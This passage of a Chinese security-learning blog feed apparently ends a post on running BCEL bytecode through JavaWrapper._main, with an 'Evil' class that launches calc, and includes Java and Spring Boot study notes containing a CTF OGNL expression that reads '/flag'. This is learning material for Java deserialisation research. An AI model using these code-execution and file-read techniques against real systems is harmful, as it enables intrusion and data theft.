alt="image-20230916121504223"></p><p>两图中的红框几乎凑出了利用ClassLoader的方式</p><p>所以<code>JavaWrapper</code>执行的原理就是通过ClassLoader的方式来执行</p><p>正常情况下找到了漏洞点，应该像找CC链一样，find usages查看谁调用了<code>runMain</code>方法</p><p>这里巧合的是就在代码下面</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916122131607.png" alt="image-20230916122131607"></p><p>到了这里思路大致就清晰了（但若细问为什么我也说不上来）</p><p><code>getClassLoader</code>什么时候调用我也不清楚</p><p>但是我们不用管那么多，只知道调用<code>_main</code>方法就行</p><p>那个class_name就像执行ClassLoader时那样，传入<code>$$BCEL$$......</code>即可</p><h2 id="上手尝试"><a href="#上手尝试" class="headerlink" title="上手尝试"></a>上手尝试</h2><p>我们先尝试原来<code>ClassLoader</code>执行时要用的恶意类</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;        <span class="hljs-keyword">static</span> &#123;            <span class="hljs-keyword">try</span> &#123;                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(e);            &#125;        &#125;&#125;</code></pre></div><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916123233706.png" alt="image-20230916123233706"></p><p>没有执行成功</p><p>按照提示加入<code>_main</code>方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_main</span><span class="hljs-params">(String[] argv)</span> &#123;        <span class="hljs-keyword">try</span> &#123;            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);        &#125;    &#125;&#125;</code></pre></div><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916123451935.png" alt="image-20230916123451935"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>JavaWrapper只是在ClassLoader基础上套了一点东西而已</p><p>更加方便了</p><div class="code-wrapper"><pre><code class="hljs powershell">JavaWrapper._main(new String[]&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>&quot;</span>+code&#125;);</code></pre></div><p>不足的是想要探究<code>getClassLoader</code>和<code>runMain</code>方法的执行顺序，但调试发现断点走完<code>_main</code>就跳出来了</p><p>并且只输出了 （我在每个函数里面加了一个System.out.println）</p><p><img src="/2023/09/16/JavaWrapper%E6%89%A7%E8%A1%8CBCEL%E5%AD%97%E8%8A%82%E7%A0%81/image-20230916125415889.png" alt="image-20230916125415889"></p><p>所以对此仍有困惑</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>浅看OGNL</title>
    <link href="/2023/09/12/%E6%B5%85%E7%9C%8BOGNL/"/>
    <url>/2023/09/12/%E6%B5%85%E7%9C%8BOGNL/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java基础和springboot</title>
    <link href="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/"/>
    <url>/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/</url>
    
    <content type="html"><![CDATA[<h1 id="java基础"><a href="#java基础" class="headerlink" title="java基础"></a>java基础</h1><p><a href="https://boogipop.com/2023/03/02/JavaSE_%E5%9F%BA%E7%A1%80/">直接看Boogipop大佬的文章，贼全面</a> ，我就记录一些不会的</p><h2 id="JVM-角度说进程与线程之间的关系"><a href="#JVM-角度说进程与线程之间的关系" class="headerlink" title="JVM 角度说进程与线程之间的关系"></a>JVM 角度说进程与线程之间的关系</h2><p>一个运行的exe就是一个进程，进程可以有多个线程</p><p>同一个进程中的多个线程共享堆和方法区</p><p>每个线程有独立的自己的程序计数器、虚拟机栈和本地方法栈</p><p>多线程并不能提高运行速度，只能提高CPU使用效率</p><h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><p>在线程中执行一个方法时，会创建一个栈帧入栈并执行，不管该栈帧是正常结束还是异常，栈帧都会销毁</p><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>SICTF看到一个很秀的操作</p><div class="code-wrapper"><pre><code class="hljs reasonml">(#a=<span class="hljs-keyword">new</span> java.util.<span class="hljs-constructor">Scanner(<span class="hljs-params">new</span> <span class="hljs-params">java</span>.<span class="hljs-params">io</span>.File(<span class="hljs-string">&quot;/flag&quot;</span>)</span>).next<span class="hljs-literal">()</span>)<span class="hljs-comment">//“#a”是因为使用OGNL表达式</span></code></pre></div><p>读取内容</p><p>两种方式读取<code>next()，nextline()</code></p><p><code>next()</code>以<strong>空格</strong>为分隔符，<code>nextline()</code>以<strong>回车</strong>为分隔符</p><div class="code-wrapper"><pre><code class="hljs abnf">Scanner test <span class="hljs-operator">=</span> new Scanner(System.in)<span class="hljs-comment">;</span>if(test.hasNext())&#123;String a <span class="hljs-operator">=</span> test.next()<span class="hljs-comment">;</span>System.out.println(a)<span class="hljs-comment">;</span>&#125;</code></pre></div><p>验证输入有<code>hasNextInt</code>、<code>hasNextDouble</code>等，然后使用对应的<code>nextInt</code>、<code>nextDouble</code>等接收参数</p><h2 id="命令行传参"><a href="#命令行传参" class="headerlink" title="命令行传参"></a>命令行传参</h2><p>是在src目录下运行，所以加上路径</p><div class="code-wrapper"><pre><code class="hljs stylus">java com<span class="hljs-selector-class">.boogipop</span><span class="hljs-selector-class">.www</span><span class="hljs-selector-class">.base</span><span class="hljs-selector-class">.DemoReload</span> <span class="hljs-selector-tag">i</span> am boogipop</code></pre></div><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911213326053.png" alt="image-20230911213326053"></p><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>简单来说就是函数的参数数量不限</p><p>（参数类型 <code>...</code> 变量名）   （加三个点）</p><div class="code-wrapper"><pre><code class="hljs typescript">package org.<span class="hljs-property">example</span>.<span class="hljs-property">basic</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) &#123;        <span class="hljs-title function_">print</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">78</span>,<span class="hljs-number">32</span>,<span class="hljs-number">32</span>,<span class="hljs-number">432</span>,<span class="hljs-number">423</span>,<span class="hljs-number">423</span>,<span class="hljs-number">423</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">print</span>(<span class="hljs-params">double ... <span class="hljs-built_in">number</span></span>)&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">number</span>.<span class="hljs-property">length</span>==<span class="hljs-number">0</span>)&#123;            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;no args&quot;</span>);            <span class="hljs-keyword">return</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">for</span>(int i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-built_in">number</span>.<span class="hljs-property">length</span>;i++)&#123;                <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-built_in">number</span>[i]);            &#125;        &#125;    &#125;&#125;</code></pre></div><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>定义一个数组，<code>int[] num = &#123;1,2,3,4,5,6&#125;</code></p><p>然后输入<code>num.for</code></p><p>就会出来增强for循环</p><div class="code-wrapper"><pre><code class="hljs css">for (int <span class="hljs-selector-tag">i</span> : num) &#123;    &#125;</code></pre></div><p>这里的<code>i</code>相当于<code>python</code>中的<code>for i in a</code>，直接就是数组内容</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911221347848.png" alt="image-20230911221347848"></p><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p><code>Arrays.toString()</code>输出数组内容</p><p><code>Arrays.sort()</code>给数组排序</p><p><code>Arrays.fill()</code>特定值填充数据</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span><span class="hljs-literal">[]</span> nm = &#123;<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">34</span>,<span class="hljs-number">15</span>,<span class="hljs-number">06</span>&#125;;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(nm);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>sort(nm);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>fill(nm,<span class="hljs-number">2</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span>fill(nm,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>);     #数组下标<span class="hljs-number">2</span>-<span class="hljs-number">4</span>，左闭右开，填充<span class="hljs-number">0</span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Arrays</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String(<span class="hljs-params">nm</span>)</span>);        ##<span class="hljs-literal">[I@<span class="hljs-number">677327</span><span class="hljs-identifier">b6</span>  #数组地址</span><span class="hljs-literal">[<span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">34</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>]</span><span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">34</span>]</span><span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>]</span><span class="hljs-literal">[<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>]</span></code></pre></div><h2 id="构造函数、this、this-、super、super-、this动态绑定"><a href="#构造函数、this、this-、super、super-、this动态绑定" class="headerlink" title="构造函数、this、this()、super、super()、this动态绑定"></a>构造函数、this、this()、super、super()、this动态绑定</h2><blockquote><p>this ：代表“当前对象”</p><p>this()：就是调用“当前对象”的无参构造方法<br>this、this()，new的谁就指向谁。父类里有this也是指向的new出来的对象。</p><p>this的动态绑定：包括静态方法和静态成员变量是前期绑定、访问方法是后期绑定</p><p>super：指向父类</p><p>super()：就是调用父类的无参构造方法<br>super、super()，仅指向上一级父类。</p></blockquote><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911224602382.png" alt="image-20230911224602382"></p><p><code>A</code>为父类，当前对象就是<code>new B</code>的<code>bb</code>，<code>s3()</code>的<code>super.s2()</code>即调用父类的<code>s2()</code>，<code>A</code>中<code>this.s1()</code>调用当前对象的<code>s1()</code>，即<code>bb</code>的<code>s1()</code>，也就是<code>B</code>中的<code>s1()</code></p><p>所以输出<code>B中的s1</code></p><p><code>A</code>不加<code>this</code>的话也是输出<code>B中的s1</code>，因为<code>B</code>为子类，相当于重写了<code>s1</code>方法</p><ul><li><h4 id="调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性"><a href="#调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性" class="headerlink" title="调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性"></a>调用方法时this是指向当前对象，但是调用属性时，是指的当前类的属性</h4></li></ul><p>两个案例理解一下这句话</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911225731256.png" alt="image-20230911225731256"></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911225746289.png" alt="image-20230911225746289"></p><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>判断两个类之间有无父子关系</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230911232058359.png" alt="image-20230911232058359"></p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230912102708510.png" alt="image-20230912102708510"></p><h2 id="静态代码块、匿名代码块、构造代码块"><a href="#静态代码块、匿名代码块、构造代码块" class="headerlink" title="静态代码块、匿名代码块、构造代码块"></a>静态代码块、匿名代码块、构造代码块</h2><h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>类似占位符，只能定义不能写</p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>跟抽象类一样</p><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>套娃</p><h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><p>try catch finally throw throws</p><p>finally不管怎样都会执行</p><h1 id="java-io"><a href="#java-io" class="headerlink" title="java io"></a>java io</h1><h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><div class="code-wrapper"><pre><code class="hljs pgsql">FileOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-built_in">new</span> FileOutputStream(&quot;flag&quot;); //创建flag文件String hello = &quot;Hello World!&quot;;<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(<span class="hljs-number">97</span>);<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-keyword">out</span>.<span class="hljs-keyword">write</span>(hello.getBytes());    //转为字节数组<span class="hljs-keyword">out</span>.<span class="hljs-keyword">close</span>();<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;finish&quot;);</code></pre></div><h3 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h3><div class="code-wrapper"><pre><code class="hljs pgsql">FileInputStream <span class="hljs-keyword">in</span> = <span class="hljs-built_in">new</span> FileInputStream(&quot;flag&quot;);<span class="hljs-keyword">while</span> ((<span class="hljs-keyword">read</span>=<span class="hljs-keyword">in</span>.<span class="hljs-keyword">read</span>())!=<span class="hljs-number">-1</span>) &#123;          <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.printf(<span class="hljs-keyword">read</span>+&quot;,&quot;);    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.printf((<span class="hljs-type">char</span>)<span class="hljs-keyword">read</span>+&quot;,&quot;);&#125;<span class="hljs-keyword">in</span>.<span class="hljs-keyword">close</span>();</code></pre></div><p>每经过一次<code>in.read()</code>就会指向下一个内容，所以先把值赋给一个变量</p><p><code>in.read()</code>返回<code>int</code>类型</p><div class="code-wrapper"><pre><code class="hljs go">FileInputStream in = <span class="hljs-built_in">new</span> FileInputStream(<span class="hljs-string">&quot;flag&quot;</span>);<span class="hljs-type">byte</span>[] buf = <span class="hljs-built_in">new</span> <span class="hljs-type">byte</span>[<span class="hljs-number">3</span>]; <span class="hljs-comment">//</span>System.out.<span class="hljs-built_in">println</span>(in.read(buf)); <span class="hljs-comment">//把内容读入数组(缓冲区)，输出的是数组长度</span>System.out.<span class="hljs-built_in">println</span>(<span class="hljs-built_in">new</span> String(buf,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)); <span class="hljs-comment">//0为偏移，1为读取的长度，不能超过数组的长度</span>in.<span class="hljs-built_in">close</span>();</code></pre></div><h3 id="BufferedInputStream"><a href="#BufferedInputStream" class="headerlink" title="BufferedInputStream"></a>BufferedInputStream</h3><p>读入缓冲区，作用跟<code>byte[] buf = new byte[3];</code>一样</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230912112835162.png" alt="image-20230912112835162"></p><div class="code-wrapper"><pre><code class="hljs pgsql">FileInputStream <span class="hljs-keyword">in</span> = <span class="hljs-built_in">new</span> FileInputStream(&quot;flag&quot;);BufferedInputStream bif = <span class="hljs-built_in">new</span> BufferedInputStream(<span class="hljs-keyword">in</span>);<span class="hljs-keyword">while</span> ((<span class="hljs-keyword">read</span>=bif.<span class="hljs-keyword">read</span>())!=<span class="hljs-number">-1</span>)&#123;    <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.print((<span class="hljs-type">char</span>)<span class="hljs-keyword">read</span>);&#125;bif.<span class="hljs-keyword">close</span>(); //也会关闭<span class="hljs-keyword">in</span></code></pre></div><h3 id="BufferedOutputStream"><a href="#BufferedOutputStream" class="headerlink" title="BufferedOutputStream"></a>BufferedOutputStream</h3><div class="code-wrapper"><pre><code class="hljs reasonml">FileOutputStream out=<span class="hljs-keyword">new</span> <span class="hljs-constructor">FileOutputStream(<span class="hljs-string">&quot;1.txt&quot;</span>)</span>;BufferedOutputStream bos=<span class="hljs-keyword">new</span> <span class="hljs-constructor">BufferedOutputStream(<span class="hljs-params">out</span>)</span>;<span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)&#123;     bos.write(<span class="hljs-string">&quot;helloworld,&quot;</span>.get<span class="hljs-constructor">Bytes()</span>); <span class="hljs-comment">//到这一步不会写入文件，只是写入了缓冲区</span>     bos.flush<span class="hljs-literal">()</span>;<span class="hljs-comment">//刷新缓冲区写入文件</span>&#125;bos.close<span class="hljs-literal">()</span>;<span class="hljs-comment">//关闭的时候也会调用flush，同时关闭out</span></code></pre></div><h3 id="ObjectInputStream和ObjectOutputStream"><a href="#ObjectInputStream和ObjectOutputStream" class="headerlink" title="ObjectInputStream和ObjectOutputStream"></a>ObjectInputStream和ObjectOutputStream</h3><p>序列化与反序列化</p><h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><p>使用字节流读取中文会出现乱码</p><h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><div class="code-wrapper"><pre><code class="hljs gradle">FileReader fr=<span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;resource/test.txt&quot;</span>);<span class="hljs-keyword">char</span>[] buf=<span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">//创建一个缓冲区</span><span class="hljs-keyword">int</span> <span class="hljs-keyword">count</span>=<span class="hljs-number">0</span>;<span class="hljs-keyword">while</span>((<span class="hljs-keyword">count</span>=fr.<span class="hljs-keyword">read</span>(buf))!=-<span class="hljs-number">1</span>)&#123;    System.out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(buf,<span class="hljs-number">0</span>,<span class="hljs-keyword">count</span>));</code></pre></div><h3 id="FileWriter"><a href="#FileWriter" class="headerlink" title="FileWriter"></a>FileWriter</h3><div class="code-wrapper"><pre><code class="hljs abnf">FileWriter fw<span class="hljs-operator">=</span>new FileWriter(<span class="hljs-string">&quot;writer.txt&quot;</span>)<span class="hljs-comment">;</span>//写入for(int i<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-comment">;i&lt;10;i++)&#123;</span>    fw.write(<span class="hljs-string">&quot;java is the best&quot;</span>)<span class="hljs-comment">;</span>    fw.flush()<span class="hljs-comment">;</span>&#125;fw.close()<span class="hljs-comment">;</span></code></pre></div><h3 id="BufferReader"><a href="#BufferReader" class="headerlink" title="BufferReader"></a>BufferReader</h3><h2 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h2><p><code>InputStreamReader/OutputStreamWriter</code></p><ul><li>可将字节流变为转换流</li><li>可设置字符的编码方式</li></ul><div class="code-wrapper"><pre><code class="hljs reasonml">FileInputStream fs= <span class="hljs-keyword">new</span> <span class="hljs-constructor">FileInputStream(<span class="hljs-string">&quot;resource/test.txt&quot;</span>)</span>; InputStreamReader isr=<span class="hljs-keyword">new</span> <span class="hljs-constructor">InputStreamReader(<span class="hljs-params">fs</span>,<span class="hljs-string">&quot;utf-8&quot;</span>)</span>;<span class="hljs-comment">//传入字节流,转换流指定utf-8编码</span> <span class="hljs-comment">//读取文件</span> <span class="hljs-built_in">int</span> data=<span class="hljs-number">0</span>; <span class="hljs-keyword">while</span>((data=isr.read<span class="hljs-literal">()</span>)!=-<span class="hljs-number">1</span>)&#123;     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println((<span class="hljs-built_in">char</span>)data); &#125; isr.close<span class="hljs-literal">()</span>;</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">FileOutputStream fo=<span class="hljs-keyword">new</span> <span class="hljs-constructor">FileOutputStream(<span class="hljs-string">&quot;fo.txt&quot;</span>)</span>;OutputStreamWriter osw=<span class="hljs-keyword">new</span> <span class="hljs-constructor">OutputStreamWriter(<span class="hljs-params">fo</span>,<span class="hljs-string">&quot;GBK&quot;</span>)</span>; <span class="hljs-comment">//gbk编码写入</span><span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;i++)&#123;    osw.write(<span class="hljs-string">&quot;我是傻逼&quot;</span>);    osw.flush<span class="hljs-literal">()</span>;&#125;osw.close<span class="hljs-literal">()</span>;</code></pre></div><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><h2 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h2><h4 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h4><blockquote><p>&#x3D;&#x3D; 基础类型对比的是值是否相同，引用类型对比的是引用是否相同；<br>equals只是单单的比较值</p></blockquote><div class="code-wrapper"><pre><code class="hljs abnf">        String s1 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-comment">;</span>        String s2 <span class="hljs-operator">=</span> <span class="hljs-string">&quot;string&quot;</span><span class="hljs-comment">;</span>        String s3 <span class="hljs-operator">=</span> new String(<span class="hljs-string">&quot;string&quot;</span>)<span class="hljs-comment">;</span>        System.out.println(s1<span class="hljs-operator">=</span><span class="hljs-operator">=</span>s2)<span class="hljs-comment">;</span>        System.out.println(s1<span class="hljs-operator">=</span><span class="hljs-operator">=</span>s3)<span class="hljs-comment">;</span>        System.out.println(s1.equals(s2))<span class="hljs-comment">;</span>        System.out.println(s1.equals(s3))<span class="hljs-comment">;</span>        /*truefalsetruetrue*/</code></pre></div><h2 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h2><p>str.charAt(str.length()-1)       &#x2F;&#x2F;里面的数字相当于数组下标</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>charAt();返回对应下标的字符<span class="hljs-regexp">//</span>toCharArray();返回字符串对应数组<span class="hljs-regexp">//i</span>ndexOf(<span class="hljs-string">&#x27;asd&#x27;</span>);返回字符串首次出现位置<span class="hljs-regexp">//</span>lastIndexOf(<span class="hljs-string">&#x27;asd&#x27;</span>);返回字符串最后一次出现的位置</code></pre></div><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="Collection接口"><a href="#Collection接口" class="headerlink" title="Collection接口"></a>Collection接口</h2><div class="code-wrapper"><pre><code class="hljs abnf">Collection col <span class="hljs-operator">=</span> new Arraylist()<span class="hljs-comment">;</span>col.add(s1)<span class="hljs-comment">;</span>col.add(s2)<span class="hljs-comment">;</span>col.add(s3)<span class="hljs-comment">;</span>Iterator it <span class="hljs-operator">=</span> col.iterator()<span class="hljs-comment">;  //迭代器</span>while(it.hasNext())&#123;System.out.println(it.next())<span class="hljs-comment">;</span>&#125;</code></pre></div><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>实际上就是常见的<T></p><h2 id="Map集合"><a href="#Map集合" class="headerlink" title="Map集合"></a>Map集合</h2><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws IOException </span>&#123;        Map&lt;<span class="hljs-type">String</span>,<span class="hljs-type">String</span>&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt;();        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;cn&quot;</span>,<span class="hljs-string">&quot;中国&quot;</span>);        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;usa&quot;</span>,<span class="hljs-string">&quot;美国&quot;</span>);        map.<span class="hljs-built_in">put</span>(<span class="hljs-string">&quot;uk&quot;</span>,<span class="hljs-string">&quot;英国&quot;</span>);        <span class="hljs-comment">//遍历map</span>        Set&lt;<span class="hljs-type">String</span>&gt; keyset = map.<span class="hljs-built_in">keySet</span>();        <span class="hljs-keyword">for</span> (<span class="hljs-type">String</span> s : map.<span class="hljs-built_in">keySet</span>()) &#123;            System.out.<span class="hljs-built_in">println</span>(s+<span class="hljs-string">&quot;--------&quot;</span>+map.<span class="hljs-built_in">get</span>(s));        &#125;        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;----------entryset---------&quot;</span>);        Set&lt;Map.Entry&lt;<span class="hljs-type">String</span>,<span class="hljs-type">String</span>&gt;&gt; entries = map.<span class="hljs-built_in">entrySet</span>();        <span class="hljs-keyword">for</span> (Map.Entry&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt; entry : entries) &#123;            System.out.<span class="hljs-built_in">println</span>(entry.<span class="hljs-built_in">getKey</span>()+<span class="hljs-string">&quot;------&quot;</span>+entry.<span class="hljs-built_in">getValue</span>());        &#125;    &#125;&#125;</code></pre></div><p>WOW，<code>entryset</code>，跟CC1的有一步骤有关</p><h2 id="注解与反射"><a href="#注解与反射" class="headerlink" title="注解与反射"></a>注解与反射</h2><h1 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h1><h2 id="创建程序"><a href="#创建程序" class="headerlink" title="创建程序"></a>创建程序</h2><p>首先安装好maven，我修改了maven的repository的位置，所以要在settings.xml中修改，修改完后关键是<code>mvn help system</code>下载<code>repository</code>里的文件（自行上网查吧）</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161000684.png" alt="image-20230913161000684"></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160546330.png" alt="image-20230913160546330"></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160804466.png" alt="image-20230913160804466"></p><p>高版本springboot需要java的高版本，我这java8用的是2.2.0（生成后手动改的）</p><p>只选择spring web就够了</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161643123.png" alt="image-20230913161643123"></p><h2 id="算了，不太会讲，就记录知识吧"><a href="#算了，不太会讲，就记录知识吧" class="headerlink" title="算了，不太会讲，就记录知识吧"></a>算了，不太会讲，就记录知识吧</h2><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@Configuration</span>    <span 